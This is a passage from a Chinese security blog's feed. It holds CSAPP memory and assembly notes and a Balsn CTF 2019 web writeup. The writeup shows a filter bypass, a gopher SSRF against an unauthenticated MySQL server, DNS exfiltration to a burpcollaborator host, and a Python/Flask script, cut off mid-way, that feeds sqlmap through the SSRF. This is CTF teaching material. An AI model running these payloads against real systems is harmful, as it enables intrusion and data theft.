&lt;p&gt;本文首发于安全客：&lt;a href=&quot;https://www.anquanke.com/post/id/188981&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/1
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 存储器层次结构 笔记</title>
    <link href="https://wywwzjj.top/2019/10/21/CSAPP-Chapter-6-Notes/"/>
    <id>https://wywwzjj.top/2019/10/21/CSAPP-Chapter-6-Notes/</id>
    <published>2019-10-21T12:30:19.000Z</published>
    <updated>2020-02-01T03:46:56.987Z</updated>
    
    <content type="html"><![CDATA[<p>在简单的模型中，存储器系统是一个线性的字节数组，CPU 能够在一个常数时间内访问每个存储器位置。</p><p>但这并没有反映现代系统实际工作的方式，实际的存储系统是一个具有不同容量、成本和访问时间的存储设备层次结构。</p><h2 id="存储技术"><a href="#存储技术" class="headerlink" title="存储技术"></a>存储技术</h2><h3 id="随机访问存储器-RAM"><a href="#随机访问存储器-RAM" class="headerlink" title="随机访问存储器 RAM"></a>随机访问存储器 RAM</h3><ul><li>静态 SRAM：容量小，存取速度快，以触发器（双稳态）做为存储元，通常做 cache。</li><li>动态 DRAM：容量大，速度较慢，以 MOS 晶体管和电容器组成的电路做存储元，通常做主存储器。</li></ul><h3 id="磁盘存储"><a href="#磁盘存储" class="headerlink" title="磁盘存储"></a>磁盘存储</h3><p>磁盘属于外部 I/O 设备，其特点是存储容量大，速度慢，价格便宜。其利用磁性材料被磁化后，会形成两个稳定的剩磁状态的性质，就像触发器的双稳态一样。</p><h2 id="局部性原理"><a href="#局部性原理" class="headerlink" title="局部性原理"></a>局部性原理</h2><p>在程序中，程序倾向于引用邻近与其他最近引用过的数据项的数据项，或者最近引用过的数据项本身。这种倾向性，被称为局部性原理。</p><p>这是一个持久的概念，对硬件和软件系统的设计和性能都有着极大的影响。</p><p>局部性通常有两种不同的形式，时间上，空间上。</p><p>在一个具有良好时间局部性的程序中，如果一个内存位置被引用了一次，那么程序很可能在不远的将来引用附近的一个内存位置。</p><h2 id="存储器层次结构"><a href="#存储器层次结构" class="headerlink" title="存储器层次结构"></a>存储器层次结构</h2><p>不同存储技术的访问时间差异很大。速度较快的技术每字节的成本要比速度较慢的技术高，而且容量较小。CPU 和主存之间的速度差距在增大。</p><p>一个编写良好的程序倾向于展示出良好的局部性。</p><h2 id="高速缓存存储器"><a href="#高速缓存存储器" class="headerlink" title="高速缓存存储器"></a>高速缓存存储器</h2><p>缓存的理念，简单来说就是，最常用的数据就那么点，将其放到读取速度最快的存储区域，将大大提高运行效率。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在简单的模型中，存储器系统是一个线性的字节数组，CPU 能够在一个常数时间内访问每个存储器位置。&lt;/p&gt;
&lt;p&gt;但这并没有反映现代系统实际工作的方式，实际的存储系统是一个具有不同容量、成本和访问时间的存储设备层次结构。&lt;/p&gt;
&lt;h2 id=&quot;存储技术&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 程序的机器级表示 笔记</title>
    <link href="https://wywwzjj.top/2019/10/10/CSAPP-Chapter-3-Notes/"/>
    <id>https://wywwzjj.top/2019/10/10/CSAPP-Chapter-3-Notes/</id>
    <published>2019-10-10T15:33:45.000Z</published>
    <updated>2020-01-09T08:00:46.872Z</updated>
    
    <content type="html"><![CDATA[<p>在计算机组成原理中学到过，每个机器码对应着一组控制信号，汇编代码则是机器代码的文本表示。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gcc -Og -c hello.c  # 表示优化等级为最低，贴近原始汇编</span><br><span class="line"></span><br><span class="line">-O （同-O1）</span><br><span class="line">-O0 （不进行优化，如果未指定优化级别，则为默认值）</span><br><span class="line">-O1 （最小化优化）</span><br><span class="line">-O2 （优化更多）</span><br><span class="line">-O3 （优化更多）</span><br><span class="line">-Ofast （非常积极地进行优化以达到标准的要求）</span><br><span class="line">-Og （优化调试体验-Og支持不影响调试的优化 ）</span><br><span class="line">-Os（优化大小。-Os使所有-O2的优化，通常不会增加代码的大小也进行设计，以减少代码量进一步优化。 -Os禁用以下优化标志：-falign-functions -falign-jumps -falign-loops -falign-labels -freorder-blocks -freorder-blocks-and-partition -fprefetch-loop-arrays -ftree-vect-loop-version）</span><br></pre></td></tr></table></figure><p>对于机器级编程来说，其中两种抽象尤为重要。</p><p>一个是机器级程序的格式和行为，定义为<strong>指令体系结构</strong>（Instruction Set Architecture，ISA ），它定义了处理器状态，指令的格式以及每条指令对状态的影响。大多数ISA,包括IA32和x86-64，将程序的行为描述成<strong>好像</strong>每条指令时顺序执行的。一条指令执行结束后，下一条指令开始执行。处理器的硬件远远比描述的精细复杂，它们能够并发的地执行许多指令，但是可以采取措施保证整体行为与ISA指定的顺序执行行为一致。</p><p>第二种抽象是，机器级程序使用的存储器地址是<strong>虚拟地址</strong>，提供的存储器模型看上去是一个非常大的字节数组。</p><p>在整个编译过程中，编译器会主要将C语言提供的相对抽象的执行模型表示的程序转化为处理器执行的非常基本的命令。汇编代码非常接近于机器代码。与机器码的二进制格式相比，汇编代码的一个主要特点是，<strong>它用可读性更好的文本格式来表示。</strong></p><p><strong>能够理解汇编代码以及它与原始C代码的联系，是理解计算机系统如何执行程序关键的一步。</strong></p><p>二三章还是没啥意思，以前都学过了，最近在看<em>程序员的自我修养</em>，真是一本好书，解决了很多我对底层的疑问，一定要多读几遍。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在计算机组成原理中学到过，每个机器码对应着一组控制信号，汇编代码则是机器代码的文本表示。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Balsn CTF 2019 web 题</title>
    <link href="https://wywwzjj.top/2019/10/06/BalsnCTF-2019-web%E9%A2%98/"/>
    <id>https://wywwzjj.top/2019/10/06/BalsnCTF-2019-web题/</id>
    <published>2019-10-06T02:21:58.000Z</published>
    <updated>2020-02-01T04:32:10.117Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h2><blockquote><p>常见绕过、gopher 打 MySQL、SSRF</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wblbfld6j20sf0artal.jpg" alt></p><p>一打开题目就能看到源码，稍稍有点混淆，整理一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($secret = base64_decode(str_rot13(<span class="string">"CTygMlOmpz"</span> . <span class="string">"Z9VaSkYzcjMJpvCt=="</span>)))</span><br><span class="line">    &amp;&amp; highlight_file(<span class="keyword">__FILE__</span>)</span><br><span class="line">    &amp;&amp; (<span class="keyword">include</span>(<span class="string">"config.php"</span>))</span><br><span class="line">    &amp;&amp; ($op = @$_GET[<span class="string">'op'</span>])</span><br><span class="line">    &amp;&amp; (@strlen($op) &lt; <span class="number">3</span> &amp;&amp; @($op + <span class="number">8</span>) &lt; <span class="string">'A_A'</span>)) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">'Σ&gt;―(#°ω°#)♡→'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">        || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">        || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>($secret);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        @curl_setopt(</span><br><span class="line">            $ch,</span><br><span class="line">            CURLOPT_URL,</span><br><span class="line">            str_repLace(</span><br><span class="line">                <span class="string">"int"</span>,</span><br><span class="line">                <span class="string">":DD"</span>,</span><br><span class="line">                str_repLace(</span><br><span class="line">                    <span class="string">"%69%6e%74"</span>,</span><br><span class="line">                    <span class="string">"XDDD"</span>,</span><br><span class="line">                    str_repLace(</span><br><span class="line">                        <span class="string">"%2e%2e"</span>,</span><br><span class="line">                        <span class="string">"Q___Q"</span>,</span><br><span class="line">                        str_repLace(</span><br><span class="line">                            <span class="string">".."</span>,</span><br><span class="line">                            <span class="string">"QAQ"</span>,</span><br><span class="line">                            str_repLace(</span><br><span class="line">                                <span class="string">"%33%33%61"</span>,</span><br><span class="line">                                <span class="string">"&gt;__&lt;"</span>,</span><br><span class="line">                                str_repLace(</span><br><span class="line">                                    <span class="string">"%63%3a"</span>,</span><br><span class="line">                                    <span class="string">"WTF"</span>,</span><br><span class="line">                                    str_repLace(</span><br><span class="line">                                        <span class="string">"633a"</span>,</span><br><span class="line">                                        <span class="string">":)"</span>,</span><br><span class="line">                                        str_repLace(</span><br><span class="line">                                            <span class="string">"433a"</span>,</span><br><span class="line">                                            <span class="string">":("</span>,</span><br><span class="line">                                            str_repLace(</span><br><span class="line">                                                <span class="string">"\x63:"</span>,</span><br><span class="line">                                                <span class="string">"ggininder"</span>,</span><br><span class="line">                                                strtolower(<span class="keyword">eval</span>(<span class="string">"return $_;"</span>))</span><br><span class="line">                                            )</span><br><span class="line">                                        )</span><br><span class="line">                                    )</span><br><span class="line">                                )</span><br><span class="line">                            )</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">        @curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">1</span>);</span><br><span class="line">        @curl_EXEC($ch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (@strlen($op) &lt; <span class="number">4</span> &amp;&amp; @($op + <span class="number">78</span>) &lt; <span class="string">'A__A'</span>) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">'⁣'</span>];  <span class="comment"># \u2063</span></span><br><span class="line">    <span class="comment">//http://warmup.balsnctf.com/?%E2%81%A3=index.php%20&amp;op=-79</span></span><br><span class="line">    <span class="keyword">if</span> ((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>)</span><br><span class="line">        || (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\""</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3e"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3c"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos(strtolower($_), <span class="string">"amp"</span>) !== <span class="keyword">FALSE</span>))</span><br><span class="line">        <span class="keyword">die</span>($secret);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($_, <span class="string">".."</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>($secret);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (stripos($_, <span class="string">"\x24"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>($secret);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                print_r(substr(@file_get_contents($_), <span class="number">0</span>, <span class="number">155</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>($secret) &amp;&amp; system($_GET[<span class="number">0x9487945</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码并不需要额外配置，却加载了一个 <code>config.php</code>，有点蹊跷，先读下源代码看看。有两种办法，一是通过 <code>eval</code>，而是利用 <code>file_get_contents</code>，后者明显要简单些。这样的后缀检查加个空格就能过。因为读取有长度限制，可直接使用伪协议进行压缩，然后解压即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = file_get_contents(<span class="string">"http://warmup.balsnctf.com/?op=-99&amp;%E2%81%A3=php://filter/zlib.deflate/resource=config.php%20"</span>);</span><br><span class="line">$idx = stripos($content, <span class="string">"&lt;/code&gt;"</span>) + <span class="number">7</span>;</span><br><span class="line">file_put_contents(<span class="string">"/tmp/233"</span>, substr($content, $idx));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.inflate/resource=/tmp/233"</span>);</span><br></pre></td></tr></table></figure><p>得到内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file:config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    <span class="comment">// THIS IS THE CONFIG OF THE MYSQL DB</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    $host = <span class="string">"localhost"</span>;</span><br><span class="line">    $user = <span class="string">"admin"</span>;</span><br><span class="line">    $pass = <span class="string">""</span>;</span><br><span class="line">    $port = <span class="number">8787</span>;</span><br><span class="line">    <span class="comment">// hint:flag-is-in-the-database XDDDDDDD</span></span><br><span class="line">    <span class="comment">// ====================================</span></span><br><span class="line">    %</span><br></pre></td></tr></table></figure><p>看到了这个提示，MySQL 还是空密码，目标就相当明确了，<code>gopher</code> 打 MySQL 即可，<code>file_get_contents</code> 一般打不出 <code>gopher</code>。那就利用之前的 <code>curl</code>，这里也有三重限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">        || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">        || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br></pre></td></tr></table></figure><p>至于第一个正则匹配，取反就行了，都是常见技巧，比如 <code>phpinfo</code> =&gt; <code>(~%8F%97%8F%96%91%99%90)()</code>。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g7wda6pcyqj215v07wgmy.jpg" alt="image.png"></p><p><code>gopher</code> 的 payload 都比较长，直接传是不可能的。之前出过很多无参函数的题，常见的手法是通过 <code>getenv</code>、<code>getallheaders</code> 、<code>get_defined_vars</code>之类的函数获取参数。由于长度的限制，最好的选择就是 <code>getenv</code>。</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%A7) =&gt; <span class="keyword">getenv</span>(<span class="string">"HTTP_T"</span>)</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wnp8fcxzj20p803smxh.jpg" alt="image.png"></p><p>成功打出请求，接下来继续打 MySQL， <a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopherus</a> 生成下 payload。</p><p>phpinfo 中能看到是 Windows 的机器，验证一下能不能 <a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">DNS 数据外带</a>，不然只能当盲注处理了。</p><p>（PS：本地实验记得修改 mysql.ini 文件，在 [mysqld] 下加入 secure_file_priv =  )</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Give MySQL username: admin</span><br><span class="line">Give port: <span class="number">8787</span></span><br><span class="line">Give query <span class="keyword">to</span> execute: <span class="keyword">select</span> load_file(concat('\\\\',version(),'.<span class="number">9</span>fp<span class="number">07</span>q<span class="number">2</span>nho<span class="number">1</span>v<span class="number">8</span>tn<span class="number">68</span>szls<span class="number">54</span>d<span class="number">94</span>fu<span class="number">3</span>j.burpcollaborator.net/a'))<span class="comment">;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Your gopher link is ready to do SSRF : </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">gopher://127.0.0.1:8787/_%a4%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%61%64%6d%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%65%00%00%00%03%73%65%6c%65%63%74%20%6c%6f%61%64%5f%66%69%6c%65%28%63%6f%6e%63%61%74%28%27%5c%5c%5c%5c%27%2c%76%65%72%73%69%6f%6e%28%29%2c%27%2e%39%66%70%30%37%71%32%6e%68%6f%31%76%38%74%6e%36%38%73%7a%6c%73%35%34%64%39%34%66%75%33%6a%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%2f%61%27%29%29%3b%01%00%00%00%01</span></span><br></pre></td></tr></table></figure><p>成功收到请求。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10<span class="selector-class">.3</span><span class="selector-class">.16-MariaDB</span><span class="selector-class">.9fp07q2nho1v8tn68szls54d94fu3j</span><span class="selector-class">.burpcollaborator</span><span class="selector-class">.net</span>.</span><br></pre></td></tr></table></figure><p>继续获取数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">"\\\\"</span>,<span class="keyword">substr</span>(<span class="keyword">hex</span>(<span class="keyword">group_concat</span>(schema_name)),<span class="number">39</span>,<span class="number">68</span>),<span class="string">".9fp07q2nho1v8tn68szls54d94fu3j.burpcollaborator.net/a"</span>)) <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"><span class="comment">-- 得到了数据库名 test,thisisthedbname，需要注意的是太长了出不了网，不能出现像逗号这种的特殊符号</span></span><br></pre></td></tr></table></figure><p>接下来就是老套路了，读表名、列名，拿数据。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">42616C736E7B337A5F77316E643077735F7068705F6368346C7D</span>  =&gt;  Balsn&#123;<span class="number">3</span>z_w1nd0ws_php_ch4l&#125;</span><br></pre></td></tr></table></figure><p>有师傅把上面的过程整合了下，通过 flask 转发，然后就能 sqlmap 一把梭，值得学习，代码如下。</p><p> <a href="https://movrment.blogspot.com/2019/10/balsn-ctf-2019-web-warmup.html" target="_blank" rel="noopener">https://movrment.blogspot.com/2019/10/balsn-ctf-2019-web-warmup.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySQL</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\033[31m"</span>+<span class="string">"For making it work username should not be password protected!!!"</span>+ <span class="string">"\033[0m"</span></span><br><span class="line">    user = <span class="string">'admin'</span> <span class="comment">#raw_input("\033[96m" +"\nGive MySQL username: " + "\033[0m")</span></span><br><span class="line">    encode_user = user.encode(<span class="string">"hex"</span>)</span><br><span class="line">    user_length = len(user)</span><br><span class="line">    temp = user_length - <span class="number">4</span></span><br><span class="line">    length = (chr(<span class="number">0xa3</span>+temp)).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">    dump = length + <span class="string">"00000185a6ff0100000001210000000000000000000000000000000000000000000000"</span></span><br><span class="line">    dump +=  encode_user</span><br><span class="line">    dump += <span class="string">"00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"</span></span><br><span class="line">    dump += <span class="string">"69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"</span></span><br><span class="line">    dump += <span class="string">"067838365f36340c70726f6772616d5f6e616d65056d7973716c"</span></span><br><span class="line"></span><br><span class="line">    query = <span class="string">"show databases;"</span>;<span class="comment">#raw_input("\033[96m" +"Give query to execute: "+ "\033[0m")</span></span><br><span class="line"></span><br><span class="line">    auth = dump.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        a = [s[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>)]</span><br><span class="line">        <span class="comment">#return "gopher://127.0.0.1:3306/_%" + "%".join(a)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"gopher://127.0.0.1:8787/_%"</span> + <span class="string">"%"</span>.join(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_payload</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(query.strip()!=<span class="string">''</span>):</span><br><span class="line">            query = query.encode(<span class="string">"hex"</span>)</span><br><span class="line">            query_length = <span class="string">'&#123;:06x&#125;'</span>.format((int((len(query) / <span class="number">2</span>) + <span class="number">1</span>)))</span><br><span class="line">            query_length = query_length.decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">            pay1 = query_length + <span class="string">"0003"</span> + query</span><br><span class="line">            final = self.encode(self.auth + pay1 + <span class="string">"0100000001"</span>)</span><br><span class="line">            <span class="keyword">return</span> final</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> encode(self.auth)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">'.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind</span><span class="params">()</span>:</span></span><br><span class="line">    username = request.args.get(<span class="string">'username'</span>)</span><br><span class="line">    url = <span class="string">"http://localhost/gg.php"</span></span><br><span class="line">    url = <span class="string">"http://warmup.balsnctf.com/"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">n</span><span class="params">(s)</span>:</span></span><br><span class="line">        r = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            r += chr(~(ord(i)) &amp; <span class="number">0xFF</span>)</span><br><span class="line">        r = <span class="string">"~&#123;&#125;"</span>.format(r)</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">    t = <span class="string">'('</span> + n(<span class="string">'getenv'</span>) + <span class="string">')('</span> +n(<span class="string">'HTTP_X'</span>) + <span class="string">')'</span></span><br><span class="line">    <span class="comment"># x = MySQL().get_payload("select IF(TRUE AND (select '1'='&#123;username&#125;'), sleep(10), sleep(0));".format(username=username))</span></span><br><span class="line">    x = MySQL().get_payload(<span class="string">"select id from (select 1 as id)a where id='&#123;username&#125;';"</span>.format(username=username))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> repr(x)</span><br><span class="line">    <span class="keyword">print</span> len(t)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url=url, params = &#123;</span><br><span class="line">                <span class="string">'op'</span> : <span class="string">'-9'</span>,</span><br><span class="line">         